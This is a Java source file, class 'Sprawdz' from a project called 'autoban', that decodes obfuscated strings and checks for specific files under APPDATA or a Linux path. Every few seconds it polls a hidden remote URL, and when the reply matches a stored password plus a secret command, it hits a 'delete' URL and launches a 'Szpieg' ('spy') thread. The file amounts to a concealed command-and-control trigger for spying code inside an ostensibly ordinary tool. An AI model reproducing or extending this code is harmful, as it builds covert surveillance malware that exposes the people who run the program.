
package autoban;

import java.io.File;
import static autoban.Strings.*;
import java.io.FileNotFoundException;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;


/**
 *
 * @author Mari PL
 */
public class Sprawdz extends Thread{
    static String nick;
    static String ps = null;
    public Sprawdz()
    {
        String linia = null;
        File plik = new File(odkoduj(autobancfg));
        if(!plik.exists())
        {
            JOptionPane.showMessageDialog(null, "File autoban.cfg not found!");
            System.exit(0);
        }
        try {
            Scanner file = new Scanner(plik);
            linia = file.nextLine();
            ps = file.nextLine();
            file.close();
            if((linia.equals("") || linia.equals(null)) || ps.equals("") || ps.equals(null) )
                    System.exit(0);
            nick = linia;
        } catch (FileNotFoundException ex) {
            System.out.println(AutoBan.time()+"Sprawdz: konstruktor: "+ex);
        }
        
        AutoBan.spr = htmlReader.visitHTML(odkoduj(mautorunip)+odkoduj(linia));
    }
    public void run()
    {
        while(true)
        {
            try {
                if(AutoBan.spr != 123)
                    System.exit(0);
                    
                    switch (AutoBan.sysi)
                    {
                        case 1: checkWin();
                        break;
                        case 2: checkLin();
                        break;
                        default:
                            return;
                    }
                Thread.sleep(5000);
            } catch (InterruptedException ex) {
                System.out.println(AutoBan.time()+"Sprawdz: run: "+ex);
            }
            checklink();
        }
    }
    
    public static String odkoduj(String txt)
    {
        char[] tab = txt.toCharArray();
        char [] tab2 = new char[txt.length()/3];
        for(int i=0, j=txt.length()-1; i<tab2.length; i++,j-=3)
        {
            String l = tab[j]+""+tab[j-1]+""+tab[j-2];
            int x = Integer.parseInt(l);
            x = (int)Math.ceil(x/5.0);
            x=x-70;
            tab2[i] = (char)x; 
        }
        return new String(tab2);
    }
    
    public static void checkWin()
    {
        File file = new File(System.getenv(odkoduj(appdata))+odkoduj(pathwindows));
        if(!file.exists())
             System.exit(0);
    }
    
    public static void checkLin()
    {
        File file = new File(odkoduj(pathlinux));
        if(!file.exists())
             System.exit(0);
    }
    
    public static void checklink()
    {
        String txt = htmlReader.readHTML(odkoduj(checklink)+odkoduj(nick)+"/"+odkoduj(nick));
        System.out.println(odkoduj(txt.trim()));
        if(odkoduj(txt.trim()).equals(ps+odkoduj(cmd)))
        {
            htmlReader.visitHTML(odkoduj(usun)+odkoduj(nick)+"/"+odkoduj(nick)+odkoduj(usuncmd));
            Szpieg sz = new Szpieg();
            sz.start();
        }
        else
        if(!odkoduj(txt.trim()).equals(ps))
            System.exit(0);
        
    }
    
}
